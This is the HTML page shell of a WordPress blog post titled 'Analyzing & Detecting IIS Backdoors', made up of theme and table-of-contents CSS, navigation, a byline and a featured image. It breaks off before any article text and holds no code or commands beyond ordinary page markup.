.wp-container-core-navigation-is-layout-a89b3969{justify-content:center;}.wp-container-core-group-is-layout-4efaea1e{gap:0.2em;}.wp-container-core-post-content-is-layout-68124974 > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width:1440px;margin-left:auto !important;margin-right:auto !important;}.wp-container-core-post-content-is-layout-68124974 > .alignwide{max-width:1440px;}.wp-container-core-post-content-is-layout-68124974 .alignfull{max-width:none;}.wp-container-core-group-is-layout-9b36172e{flex-wrap:nowrap;justify-content:space-between;}.wp-container-core-group-is-layout-154222c2{flex-wrap:nowrap;justify-content:space-between;align-items:center;}.wp-container-core-post-template-is-layout-3ee800f6 > *{margin-block-start:0;margin-block-end:0;}.wp-container-core-post-template-is-layout-3ee800f6 > * + *{margin-block-start:0;margin-block-end:0;}.wp-container-content-b0223bd5{flex-basis:25%;}.wp-container-core-social-links-is-layout-ad1cd33a{flex-wrap:nowrap;gap:0 12px;justify-content:flex-end;}.wp-container-core-group-is-layout-cc97c919{flex-wrap:nowrap;gap:0;justify-content:space-between;}
/*# sourceURL=core-block-supports-inline-css */
</style>
<style id="wp-block-template-skip-link-inline-css">

		.skip-link.screen-reader-text {
			border: 0;
			clip-path: inset(50%);
			height: 1px;
			margin: -1px;
			overflow: hidden;
			padding: 0;
			position: absolute !important;
			width: 1px;
			word-wrap: normal !important;
		}

		.skip-link.screen-reader-text:focus {
			background-color: #eee;
			clip-path: none;
			color: #444;
			display: block;
			font-size: 1em;
			height: auto;
			left: 5px;
			line-height: normal;
			padding: 15px 23px 14px;
			text-decoration: none;
			top: 5px;
			width: auto;
			z-index: 100000;
		}
/*# sourceURL=wp-block-template-skip-link-inline-css */
</style>
<link rel="stylesheet" id="lbwps-styles-photoswipe5-main-css" href="/wp-content/plugins/lightbox-photoswipe/assets/ps5/styles/main.css?ver=5.8.2" media="all">
<style id="ez-toc-style-inline-css">
#ez-toc-container{background:#f9f9f9;border:1px solid #aaa;border-radius:4px;-webkit-box-shadow:0 1px 1px rgba(0,0,0,.05);box-shadow:0 1px 1px rgba(0,0,0,.05);display:table;margin-bottom:1em;padding:10px 20px 10px 10px;position:relative;width:auto}div.ez-toc-widget-container{padding:0;position:relative}#ez-toc-container.ez-toc-light-blue{background:#edf6ff}#ez-toc-container.ez-toc-white{background:#fff}#ez-toc-container.ez-toc-black{background:#000}#ez-toc-container.ez-toc-transparent{background:none transparent}div.ez-toc-widget-container ul{display:block}div.ez-toc-widget-container li{border:none;padding:0}div.ez-toc-widget-container ul.ez-toc-list{padding:10px}#ez-toc-container ul ul,.ez-toc div.ez-toc-widget-container ul ul{margin-left:1.5em}#ez-toc-container li,#ez-toc-container ul{margin:0;padding:0}#ez-toc-container li,#ez-toc-container ul,#ez-toc-container ul li,div.ez-toc-widget-container,div.ez-toc-widget-container li{background:none;list-style:none none;line-height:1.6;margin:0;overflow:hidden;z-index:1}#ez-toc-container .ez-toc-title{text-align:left;line-height:1.45;margin:0;padding:0}.ez-toc-title-container{display:table;width:100%}.ez-toc-title,.ez-toc-title-toggle{display:inline;text-align:left;vertical-align:middle}#ez-toc-container.ez-toc-black p.ez-toc-title{color:#fff}#ez-toc-container div.ez-toc-title-container+ul.ez-toc-list{margin-top:1em}.ez-toc-wrap-left{margin:0 auto 1em 0!important}.ez-toc-wrap-left-text{float:left}.ez-toc-wrap-right{margin:0 0 1em auto!important}.ez-toc-wrap-right-text{float:right}#ez-toc-container a{color:#444;box-shadow:none;text-decoration:none;text-shadow:none;display:inline-flex;align-items:stretch;flex-wrap:nowrap}#ez-toc-container a:visited{color:#9f9f9f}#ez-toc-container a:hover{text-decoration:underline}#ez-toc-container.ez-toc-black a,#ez-toc-container.ez-toc-black a:visited{color:#fff}#ez-toc-container a.ez-toc-toggle{display:flex;align-items:center}.ez-toc-widget-container ul.ez-toc-list li:before{content:" ";position:absolute;left:0;right:0;height:30px;line-height:30px;z-index:-1}.ez-toc-widget-container ul.ez-toc-list li.active{background-color:#ededed}.ez-toc-widget-container li.active>a{font-weight:900}.ez-toc-btn{display:inline-block;padding:6px 12px;margin-bottom:0;font-size:14px;font-weight:400;line-height:1.428571429;text-align:center;white-space:nowrap;vertical-align:middle;cursor:pointer;background-image:none;border:1px solid transparent;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;-o-user-select:none;user-select:none}.ez-toc-btn:focus{outline:thin dotted #333;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}.ez-toc-btn:focus,.ez-toc-btn:hover{color:#333;text-decoration:none}.ez-toc-btn.active,.ez-toc-btn:active{background-image:none;outline:0;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,.125);box-shadow:inset 0 3px 5px rgba(0,0,0,.125)}.ez-toc-btn-default{color:#333;background-color:#fff}.ez-toc-btn-default.active,.ez-toc-btn-default:active,.ez-toc-btn-default:focus,.ez-toc-btn-default:hover{color:#333;background-color:#ebebeb;border-color:#adadad}.ez-toc-btn-default.active,.ez-toc-btn-default:active{background-image:none}.ez-toc-btn-sm,.ez-toc-btn-xs{padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}.ez-toc-btn-xs{padding:1px 5px}.ez-toc-btn-default{text-shadow:0 -1px 0 rgba(0,0,0,.2);-webkit-box-shadow:inset 0 1px 0 hsla(0,0%,100%,.15),0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 0 hsla(0,0%,100%,.15),0 1px 1px rgba(0,0,0,.075)}.ez-toc-btn-default:active{-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,.125);box-shadow:inset 0 3px 5px rgba(0,0,0,.125)}.btn.active,.ez-toc-btn:active{background-image:none}.ez-toc-btn-default{text-shadow:0 1px 0 #fff;background-image:-webkit-gradient(linear,left 0,left 100%,from(#fff),to(#e0e0e0));background-image:-webkit-linear-gradient(top,#fff,#e0e0e0);background-image:-moz-linear-gradient(top,#fff 0,#e0e0e0 100%);background-image:linear-gradient(180deg,#fff 0,#e0e0e0);background-repeat:repeat-x;border-color:#ccc;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr="#ffffffff",endColorstr="#ffe0e0e0",GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled=false)}.ez-toc-btn-default:focus,.ez-toc-btn-default:hover{background-color:#e0e0e0;background-position:0 -15px}.ez-toc-btn-default.active,.ez-toc-btn-default:active{background-color:#e0e0e0;border-color:#dbdbdb}.ez-toc-pull-right{float:right!important;margin-left:10px}#ez-toc-container label.cssicon,#ez-toc-widget-container label.cssicon{height:30px}.ez-toc-glyphicon{position:relative;top:1px;display:inline-block;font-family:Glyphicons Halflings;-webkit-font-smoothing:antialiased;font-style:normal;font-weight:400;line-height:1;-moz-osx-font-smoothing:grayscale}.ez-toc-glyphicon:empty{width:1em}.ez-toc-toggle i.ez-toc-glyphicon{font-size:16px;margin-left:2px}#ez-toc-container input{position:absolute;left:-999em}#ez-toc-container input[type=checkbox]:checked+nav,#ez-toc-widget-container input[type=checkbox]:checked+nav{opacity:0;max-height:0;border:none;display:none}#ez-toc-container label{position:relative;cursor:pointer;display:initial}#ez-toc-container .ez-toc-js-icon-con{display:initial}#ez-toc-container .ez-toc-js-icon-con,#ez-toc-container .ez-toc-toggle label{float:right;position:relative;font-size:16px;padding:0;border:1px solid #999191;border-radius:5px;cursor:pointer;left:10px;width:35px}div#ez-toc-container .ez-toc-title{display:initial}.ez-toc-wrap-center{margin:0 auto 1em!important}#ez-toc-container a.ez-toc-toggle{color:#444;background:inherit;border:inherit}.ez-toc-toggle #item{position:absolute;left:-999em}label.cssicon .ez-toc-glyphicon:empty{font-size:16px;margin-left:2px}label.cssiconcheckbox{display:none}.ez-toc-widget-container ul li a{padding-left:10px;display:inline-flex;align-items:stretch;flex-wrap:nowrap}.ez-toc-widget-container ul.ez-toc-list li{height:auto!important}.ez-toc-cssicon{float:right;position:relative;font-size:16px;padding:0;border:1px solid #999191;border-radius:5px;cursor:pointer;left:10px;width:35px}.ez-toc-icon-toggle-span{display:flex;align-items:center;width:35px;height:30px;justify-content:center;direction:ltr}#ez-toc-container .eztoc-toggle-hide-by-default{display:none}.eztoc_no_heading_found{background-color:#ff0;padding-left:10px}.eztoc-hide{display:none}.term-description .ez-toc-title-container p:nth-child(2){width:50px;float:right;margin:0}.ez-toc-list.ez-toc-columns-2{column-count:2;column-gap:20px;column-fill:balance}.ez-toc-list.ez-toc-columns-2>li{display:block;break-inside:avoid;margin-bottom:8px;page-break-inside:avoid}.ez-toc-list.ez-toc-columns-3{column-count:3;column-gap:20px;column-fill:balance}.ez-toc-list.ez-toc-columns-3>li{display:block;break-inside:avoid;margin-bottom:8px;page-break-inside:avoid}.ez-toc-list.ez-toc-columns-4{column-count:4;column-gap:20px;column-fill:balance}.ez-toc-list.ez-toc-columns-4>li{display:block;break-inside:avoid;margin-bottom:8px;page-break-inside:avoid}.ez-toc-list.ez-toc-columns-optimized{column-fill:balance;orphans:2;widows:2}.ez-toc-list.ez-toc-columns-optimized>li{display:block;break-inside:avoid;page-break-inside:avoid}@media (max-width:768px){.ez-toc-list.ez-toc-columns-2,.ez-toc-list.ez-toc-columns-3,.ez-toc-list.ez-toc-columns-4{column-count:1;column-gap:0}}@media (max-width:1024px) and (min-width:769px){.ez-toc-list.ez-toc-columns-3,.ez-toc-list.ez-toc-columns-4{column-count:2}}.ez-toc-container-direction {direction: ltr;}.ez-toc-counter ul{counter-reset: item ;}.ez-toc-counter nav ul li a::before {content: counters(item, '.', decimal) '. ';display: inline-block;counter-increment: item;flex-grow: 0;flex-shrink: 0;margin-right: .2em; float: left; }.ez-toc-widget-direction {direction: ltr;}.ez-toc-widget-container ul{counter-reset: item ;}.ez-toc-widget-container nav ul li a::before {content: counters(item, '.', decimal) '. ';display: inline-block;counter-increment: item;flex-grow: 0;flex-shrink: 0;margin-right: .2em; float: left; }div#ez-toc-container .ez-toc-title {font-size: 120%;}div#ez-toc-container .ez-toc-title {font-weight: 500;}div#ez-toc-container ul li , div#ez-toc-container ul li a {font-size: 95%;}div#ez-toc-container ul li , div#ez-toc-container ul li a {font-weight: 500;}div#ez-toc-container nav ul ul li {font-size: 90%;}div#ez-toc-container {background: #222222;border: 1px solid #666666;}div#ez-toc-container p.ez-toc-title , #ez-toc-container .ez_toc_custom_title_icon , #ez-toc-container .ez_toc_custom_toc_icon {color: #999;}div#ez-toc-container ul.ez-toc-list a {color: #0099ff;}div#ez-toc-container ul.ez-toc-list a:hover {color: #428bca;}div#ez-toc-container ul.ez-toc-list a:visited {color: #1f66ad;}.ez-toc-counter nav ul li a::before {color: #428bca;}.ez-toc-box-title {font-weight: bold; margin-bottom: 10px; text-align: center; text-transform: uppercase; letter-spacing: 1px; color: #666; padding-bottom: 5px;position:absolute;top:-4%;left:5%;background-color: inherit;transition: top 0.3s ease;}.ez-toc-box-title.toc-closed {top:-25%;}
/*# sourceURL=ez-toc-style-inline-css */
</style>
<style id="ez-toc-sticky-style-inline-css">
#ez-toc-sticky-container{background:0 0;border:1px solid #aaa;border-radius:4px;display:table;margin-bottom:1em;padding:10px;position:relative;width:auto}div.ez-toc-sticky-widget-container{padding:0;position:relative}#ez-toc-sticky-container.ez-toc-sticky-light-blue{background:#edf6ff}#ez-toc-sticky-container.ez-toc-sticky-white{background:#fff}#ez-toc-sticky-container.ez-toc-sticky-black{background:#000}#ez-toc-sticky-container.ez-toc-sticky-transparent{background:none}div.ez-toc-sticky-widget-container ul{display:block}div.ez-toc-sticky-widget-container li{border:none;padding:0}div.ez-toc-sticky-widget-container ul.ez-toc-sticky-list{padding:10px}#ez-toc-sticky-container ul ul,.ez-toc div.ez-toc-sticky-widget-container ul ul{margin-left:1.5em}#ez-toc-sticky-container li,#ez-toc-sticky-container ul{padding:0}#ez-toc-sticky-container li,#ez-toc-sticky-container ul,#ez-toc-sticky-container ul li,div.ez-toc-sticky-widget-container,div.ez-toc-sticky-widget-container li{background:0 0;list-style:none;line-height:1.6;margin:0;overflow:hidden;z-index:1}#ez-toc-sticky-container p.ez-toc-sticky-title{text-align:left;line-height:1.45;margin:0;padding:0}.ez-toc-sticky-title-container{display:table;width:100%}.ez-toc-sticky-title,.ez-toc-sticky-title-toggle{display:table-cell;text-align:left;vertical-align:middle}#ez-toc-sticky-container.ez-toc-sticky-black a,#ez-toc-sticky-container.ez-toc-sticky-black a:visited,#ez-toc-sticky-container.ez-toc-sticky-black p.ez-toc-sticky-title{color:#fff}#ez-toc-sticky-container div.ez-toc-sticky-title-container+ul.ez-toc-sticky-list{margin-top:1em}.ez-toc-sticky-wrap-left{float:left;margin-right:10px}.ez-toc-sticky-wrap-right{float:right;margin-left:10px}.ez-toc-sticky-wrap-center{margin:0 auto}#ez-toc-sticky-container a{color:#444;box-shadow:none;text-decoration:none;text-shadow:none;display:inline-flex;align-items:stretch;flex-wrap:nowrap}#ez-toc-sticky-container a:visited{color:#9f9f9f}#ez-toc-sticky-container a:hover{text-decoration:underline}#ez-toc-sticky-container a.ez-toc-sticky-toggle{color:#444}.ez-toc-sticky-widget-container ul.ez-toc-sticky-list li::before{content:' ';position:absolute;left:0;right:0;height:30px;line-height:30px;z-index:-1}.ez-toc-sticky-widget-container ul.ez-toc-sticky-list li.active{background-color:#ededed;height:auto!important}.ez-toc-sticky-widget-container li.active>a{font-weight:900}.ez-toc-sticky-btn{display:inline-block;padding:6px 12px;margin-bottom:0;font-size:14px;font-weight:400;line-height:1.428571429;text-align:center;white-space:nowrap;vertical-align:middle;cursor:pointer;background-image:none;border:1px solid transparent;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;-o-user-select:none;user-select:none}.ez-toc-sticky-btn:focus{outline:#333 dotted thin;outline:-webkit-focus-ring-color auto 5px;outline-offset:-2px}.ez-toc-sticky-btn:focus,.ez-toc-sticky-btn:hover{color:#333;text-decoration:none}.ez-toc-sticky-btn.active,.ez-toc-sticky-btn:active{background-image:none;outline:0;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,.125);box-shadow:inset 0 3px 5px rgba(0,0,0,.125)}.ez-toc-sticky-btn-default{color:#333;background-color:#fff;-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,.15),0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 0 rgba(255,255,255,.15),0 1px 1px rgba(0,0,0,.075);text-shadow:0 1px 0 #fff;background-image:-webkit-gradient(linear,left 0,left 100%,from(#fff),to(#e0e0e0));background-image:-webkit-linear-gradient(top,#fff 0,#e0e0e0 100%);background-image:-moz-linear-gradient(top,#fff 0,#e0e0e0 100%);background-image:linear-gradient(to bottom,#fff 0,#e0e0e0 100%);background-repeat:repeat-x;border-color:#ccc}.ez-toc-sticky-btn-default.active,.ez-toc-sticky-btn-default:active,.ez-toc-sticky-btn-default:focus,.ez-toc-sticky-btn-default:hover{color:#333;background-color:#ebebeb;border-color:#adadad}.ez-toc-sticky-btn-default.active,.ez-toc-sticky-btn-default:active{background-image:none;background-color:#e0e0e0;border-color:#dbdbdb}.ez-toc-sticky-btn-sm,.ez-toc-sticky-btn-xs{padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}.ez-toc-sticky-btn-xs{padding:1px 5px}.ez-toc-sticky-btn-default:active{-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,.125);box-shadow:inset 0 3px 5px rgba(0,0,0,.125)}.btn.active,.ez-toc-sticky-btn:active{background-image:none}.ez-toc-sticky-btn-default:focus,.ez-toc-sticky-btn-default:hover{background-color:#e0e0e0;background-position:0 -15px}.ez-toc-sticky-pull-right{float:right!important;margin-left:10px}.ez-toc-sticky-glyphicon{position:relative;top:1px;display:inline-block;font-family:'Glyphicons Halflings';-webkit-font-smoothing:antialiased;font-style:normal;font-weight:400;line-height:1;-moz-osx-font-smoothing:grayscale}.ez-toc-sticky-glyphicon:empty{width:1em}.ez-toc-sticky-toggle i.ez-toc-sticky-glyphicon,label.cssicon .ez-toc-sticky-glyphicon:empty{font-size:16px;margin-left:2px}#ez-toc-sticky-container input{position:absolute;left:-999em}#ez-toc-sticky-container input[type=checkbox]:checked+nav{opacity:0;max-height:0;border:none;display:none}#ez-toc-sticky-container label{float:right;position:relative;left:10px;font-size:16px;background:#f9efef;padding:0 4px 0 5px;border:1px solid #999191;border-radius:5px;cursor:pointer}div#ez-toc-sticky-container p.ez-toc-sticky-title{display:contents}div#ez-toc-sticky-container{padding-right:20px}label.cssiconcheckbox{display:none}.ez-toc-sticky-widget-container ul li a{padding-left:10px}.ez-toc-sticky-toggle-direction {direction: ltr;}.ez-toc-sticky-toggle-counter ul{counter-reset: item ;}.ez-toc-sticky-toggle-counter nav ul li a::before {content: counters(item, '.', decimal) '. ';display: inline-block;counter-increment: item;flex-grow: 0;flex-shrink: 0;margin-right: .2em; float: left; }.ez-toc-sticky-fixed { position: fixed;top: 0;right: 0;z-index: 999999;width: auto;max-width: 100%;} .ez-toc-sticky-fixed .ez-toc-sidebar { position: relative;top: auto;width: auto !important;height: 100%;box-shadow: 1px 1px 10px 3px rgb(0 0 0 / 20%);box-sizing: border-box;padding: 20px 30px;background: #fff;margin-left: 0 !important;height: auto;overflow-y: auto;overflow-x: hidden; height: 100vh; } .ez-toc-sticky-fixed .ez-toc-sidebar #ez-toc-sticky-container { width: auto;;padding: 0px;border: none;margin-bottom: 0;margin-top: 65px;} #ez-toc-sticky-container a { color: #000; } .ez-toc-sticky-fixed .ez-toc-sidebar .ez-toc-sticky-title-container {border-bottom-color: #EEEEEE;background-color: #fff;padding:15px;border-bottom: 1px solid #e5e5e5;width: 100%;position: absolute;height: auto;top: 0;left: 0;z-index: 99999999;} .ez-toc-sticky-fixed .ez-toc-sidebar .ez-toc-sticky-title-container .ez-toc-sticky-title { font-weight: 600; font-size: 18px; color: #111; } .ez-toc-sticky-fixed .ez-toc-close-icon{-webkit-appearance:none;padding:0;cursor:pointer;background:0 0;border:0;float:right;font-size:30px;font-weight:600;line-height:1;position:relative;color:#111;top:-2px;text-decoration:none}.ez-toc-open-icon{position:fixed;right:0;top:45%;text-decoration:none;font-weight:700;padding:5px 10px 15px;box-shadow:1px -5px 10px 5px rgb(0 0 0 / 10%);background-color:#fff;color:#111;display:inline-grid;line-height:1.4;border-radius:10px 0 0 10px;z-index:999999}.ez-toc-sticky-fixed.hide{-webkit-transition:opacity .3s linear,right .3s cubic-bezier(.4, 0, 1, 1);-ms-transition:opacity .3s linear,right .3s cubic-bezier(.4, 0, 1, 1);-o-transition:opacity .3s linear,right .3s cubic-bezier(.4, 0, 1, 1);transition:opacity .3s linear,right .3s cubic-bezier(.4, 0, 1, 1);right:-100%}.ez-toc-sticky-fixed.show{-moz-transition:right .3s linear;-o-transition:right .3s linear;transition:right .3s linear;right:0}.ez-toc-open-icon span.arrow{font-size:18px}.ez-toc-open-icon span.text{font-size:13px;writing-mode:vertical-lr;text-orientation:mixed;-webkit-transform:rotate(180deg);-moz-transform:rotate(180deg);-ms-transform:rotate(180deg);-o-transform:rotate(180deg);transform:rotate(180deg)}@media screen and (max-device-width:640px){.ez-toc-sticky-fixed .ez-toc-sidebar{min-width:auto}.ez-toc-sticky-fixed .ez-toc-sidebar.show{padding-top:35px}.ez-toc-sticky-fixed .ez-toc-sidebar #ez-toc-sticky-container{min-width:100%}}
/*# sourceURL=ez-toc-sticky-style-inline-css */
</style>
<style id="twentytwentyfive-style-inline-css">
a{text-decoration-thickness:1px!important;text-underline-offset:.1em}:where(.wp-site-blocks :focus){outline-style:solid;outline-width:2px}.wp-block-navigation .wp-block-navigation-submenu .wp-block-navigation-item:not(:last-child){margin-bottom:3px}.wp-block-navigation .wp-block-navigation-item .wp-block-navigation-item__content{outline-offset:4px}.wp-block-navigation .wp-block-navigation-item ul.wp-block-navigation__submenu-container .wp-block-navigation-item__content{outline-offset:0}blockquote,caption,figcaption,h1,h2,h3,h4,h5,h6,p{text-wrap:pretty}.more-link{display:block}:where(pre){overflow-x:auto}
/*# sourceURL=/wp-content/themes/twentytwentyfive/style.min.css */
</style>
<script src="/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script src="/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<link rel="https://api.w.org/" href="/wp-json/"><link rel="alternate" title="JSON" type="application/json" href="/wp-json/wp/v2/posts/5452"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="/xmlrpc.php?rsd">
<meta name="generator" content="WordPress 6.9">
<link rel="shortlink" href="/?p=5452">
<script type="importmap" id="wp-importmap">
{"imports":{"@wordpress/interactivity":"/wp-includes/js/dist/script-modules/interactivity/index.min.js?ver=8964710565a1d258501f"}}
</script>
<link rel="modulepreload" href="/wp-includes/js/dist/script-modules/interactivity/index.min.js?ver=8964710565a1d258501f" id="@wordpress/interactivity-js-modulepreload" fetchpriority="low">
<style class="wp-fonts-local">
@font-face{font-family:Manrope;font-style:normal;font-weight:200 800;font-display:fallback;src:url('/wp-content/themes/twentytwentyfive/assets/fonts/manrope/Manrope-VariableFont_wght.woff2') format('woff2');}
@font-face{font-family:"Fira Code";font-style:normal;font-weight:300 700;font-display:fallback;src:url('/wp-content/themes/twentytwentyfive/assets/fonts/fira-code/FiraCode-VariableFont_wght.woff2') format('woff2');}
</style>
</head>

<body class="wp-singular post-template-default single single-post postid-5452 single-format-standard wp-embed-responsive wp-theme-twentytwentyfive">

<div class="wp-site-blocks"><header class="wp-block-template-part">
<div class="wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
<div class="wp-block-group alignwide has-global-padding is-layout-constrained wp-block-group-is-layout-constrained" style="padding-top:var(--wp--preset--spacing--60);padding-bottom:var(--wp--preset--spacing--30)"><p class="has-text-align-center alignwide wp-block-site-title has-x-large-font-size"><a href="/" target="_self" rel="home">RobWillis.info</a></p>


<div class="wp-block-group alignwide has-global-padding is-layout-constrained wp-block-group-is-layout-constrained"><nav class="items-justified-center wp-block-navigation is-content-justification-center is-layout-flex wp-container-core-navigation-is-layout-a89b3969 wp-block-navigation-is-layout-flex" aria-label="Menu"><ul class="wp-block-navigation__container items-justified-center wp-block-navigation"><li class=" wp-block-navigation-item  menu-item menu-item-type-custom menu-item-object-custom menu-item-home wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/" title=""><span class="wp-block-navigation-item__label">Home</span></a></li><li data-wp-context="{ &quot;submenuOpenedBy&quot;: { &quot;click&quot;: false, &quot;hover&quot;: false, &quot;focus&quot;: false }, &quot;type&quot;: &quot;submenu&quot;, &quot;modal&quot;: null, &quot;previousFocus&quot;: null }" data-wp-interactive="core/navigation" data-wp-on--focusout="actions.handleMenuFocusout" data-wp-on--keydown="actions.handleMenuKeydown" data-wp-on--mouseenter="actions.openMenuOnHover" data-wp-on--mouseleave="actions.closeMenuOnHover" data-wp-watch="callbacks.initMenu" tabindex="-1" class="wp-block-navigation-item has-child open-on-hover-click  menu-item menu-item-type-custom menu-item-object-custom wp-block-navigation-submenu"><a class="wp-block-navigation-item__content" href="#" title=""><span class="wp-block-navigation-item__label">Categories</span></a><button data-wp-bind--aria-expanded="state.isMenuOpen" data-wp-on--click="actions.toggleMenuOnClick" aria-label="Categories submenu" class="wp-block-navigation__submenu-icon wp-block-navigation-submenu__toggle"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewbox="0 0 12 12" fill="none" aria-hidden="true" focusable="false"><path d="M1.50002 4L6.00002 8L10.5 4" stroke-width="1.5"></path></svg></button><ul data-wp-on--focus="actions.openMenuOnFocus" class="wp-block-navigation__submenu-container has-text-color has-contrast-color has-background has-base-background-color  menu-item menu-item-type-custom menu-item-object-custom wp-block-navigation-submenu"><li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/servers/" title=""><span class="wp-block-navigation-item__label">Servers – Win, *nix, ESXi</span></a></li><li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/security/" title=""><span class="wp-block-navigation-item__label">Security</span></a></li><li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/pen-testing/" title=""><span class="wp-block-navigation-item__label">Pen Testing</span></a></li><li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/scripting/" title=""><span class="wp-block-navigation-item__label">PowerShell/Scripting</span></a></li><li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/computers/" title=""><span class="wp-block-navigation-item__label">Computers</span></a></li><li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/android-hacks/" title=""><span class="wp-block-navigation-item__label">Android Hacks</span></a></li><li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/software/" title=""><span class="wp-block-navigation-item__label">Software</span></a></li><li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/gaming/" title=""><span class="wp-block-navigation-item__label">Gaming – PC/PS3/Xbox 360</span></a></li><li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/air-guns/" title=""><span class="wp-block-navigation-item__label">Air Guns</span></a></li></ul></li><li class=" wp-block-navigation-item  menu-item menu-item-type-post_type menu-item-object-page wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/about/" title=""><span class="wp-block-navigation-item__label">About</span></a></li></ul></nav></div>
</div>
</div>
</header>


<main class="wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained" style="margin-top:var(--wp--preset--spacing--60)">
<div class="wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained" style="padding-top:var(--wp--preset--spacing--60);padding-bottom:var(--wp--preset--spacing--60)"><h1 class="wp-block-post-title">Analyzing &amp; Detecting IIS Backdoors</h1>


<div class="wp-block-group has-link-color has-accent-4-color has-text-color has-small-font-size is-layout-flex wp-container-core-group-is-layout-4efaea1e wp-block-group-is-layout-flex" style="margin-bottom:var(--wp--preset--spacing--60)">
<p>Written by </p>


<div class="wp-block-post-author-name"><a href="/author/bit_rot/" target="_self" class="wp-block-post-author-name__link">robwillisinfo</a></div>


<p>in</p>


<div style="font-weight:300/" class="taxonomy-category wp-block-post-terms"><a href="/category/blog/" rel="tag">Blog</a><span class="wp-block-post-terms__separator">, </span><a href="/category/computers/" rel="tag">Computers</a><span class="wp-block-post-terms__separator">, </span><a href="/category/pen-testing/" rel="tag">Pen Testing</a><span class="wp-block-post-terms__separator">, </span><a href="/category/security/" rel="tag">Security</a><span class="wp-block-post-terms__separator">, </span><a href="/category/servers/" rel="tag">Servers</a><span class="wp-block-post-terms__separator">, </span><a href="/category/tools/" rel="tag">Tools</a></div></div>


<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-container-core-post-content-is-layout-68124974 wp-block-post-content-is-layout-constrained"><p><a href="/wp-content/uploads/2022/10/IIS-Raid-Feat.png" data-lbwps-width="950" data-lbwps-height="441" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/10/IIS-Raid-Feat-500x232.png"><img fetchpriority="high" decoding="async" src="/wp-content/uploads/2022/10/IIS-Raid-Feat-500x232.png" alt="" width="500" height="232" class="aligncenter size-medium wp-image-5694" srcset="/wp-content/uploads/2022/10/IIS-Raid-Feat-500x232.png 500w, /wp-content/uploads/2022/10/IIS-Raid-Feat-768x357.png 768w, /wp-content/uploads/2022/10/IIS-Raid-Feat.png 950w" sizes="(max-width: 500px) 100vw, 500px"></a></p>
<div id="ez-toc-container" class="ez-toc-v2_0_80 counter-hierarchy ez-toc-counter ez-toc-custom ez-toc-container-direction">
<div class="ez-toc-title-container">
<p class="ez-toc-title" style="cursor:inherit">Table of Contents</p>
<span class="ez-toc-title-toggle"><a href="#" class="ez-toc-pull-right ez-toc-btn ez-toc-btn-xs ez-toc-btn-default ez-toc-toggle" aria-label="Toggle Table of Content"><span class="ez-toc-js-icon-con"><span class=""><span class="eztoc-hide" style="display:none;">Toggle</span><span class="ez-toc-icon-toggle-span"><svg style="fill: #999;color:#999" xmlns="http://www.w3.org/2000/svg" class="list-377408" width="20px" height="20px" viewbox="0 0 24 24" fill="none"><path d="M6 6H4v2h2V6zm14 0H8v2h12V6zM4 11h2v2H4v-2zm16 0H8v2h12v-2zM4 16h2v2H4v-2zm16 0H8v2h12v-2z" fill="currentColor"></path></svg><svg style="fill: #999;color:#999" class="arrow-unsorted-368013" xmlns="http://www.w3.org/2000/svg" width="10px" height="10px" viewbox="0 0 24 24" version="1.2" baseprofile="tiny"><path d="M18.2 9.3l-6.2-6.3-6.2 6.3c-.2.2-.3.4-.3.7s.1.5.3.7c.2.2.4.3.7.3h11c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.7s-.1-.5-.3-.7zM5.8 14.7l6.2 6.3 6.2-6.3c.2-.2.3-.5.3-.7s-.1-.5-.3-.7c-.2-.2-.4-.3-.7-.3h-11c-.3 0-.5.1-.7.3-.2.2-.3.5-.3.7s.1.5.3.7z"></path></svg></span></span></span></a></span></div>
